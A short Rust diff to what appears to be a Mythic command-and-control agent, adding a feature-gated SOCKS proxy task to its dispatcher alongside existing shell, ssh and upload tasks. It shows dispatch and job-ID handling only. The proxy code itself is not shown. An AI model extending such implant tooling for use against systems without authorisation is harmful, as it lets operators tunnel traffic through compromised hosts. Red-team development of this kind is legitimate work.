@@ -13,6 +13,9 @@ use crate::{
     redirect, rm, setenv, shell, sleep, ssh, unsetenv, upload, workinghours,
 };
 
+#[cfg(feature = "socks")]
+use crate::socks::task_socks;
+
 /// Struct which holds the information about background jobs
 #[derive(Debug)]
 pub struct BackgroundTask {
@@ -167,6 +170,32 @@ impl Tasker {
                             Err(e) => self
                                 .completed_tasks
                                 .push(mythic_error!(task.id, e.to_string())),
+                        }
+                        continue;
+                    }
+
+                    #[cfg(feature = "socks")]
+                    "socks" => {
+                        match task_socks(task, 
+                            &mut agent.socks_from_backend,
+                            &mut agent.socks_to_backend) {
+                            Ok(Some(bgtask)) => {
+                                // Assign a new ID to the job
+                                bgtask.id = if let Some(id) = self.cached_ids.pop_front() {
+                                    id
+                                } else {
+                                    self.dispatch_val += 1;
+                                    self.dispatch_val - 1
+                                };
+                                self.background_tasks.push(bgtask);
+                            },
+                            Ok(None) => {
+
+                            },
+                            Err(e) => {
+                                self.completed_tasks
+                                    .push(mythic_error!(task.id, e.to_string()));
+                            }
                         }
                         continue;
                     }
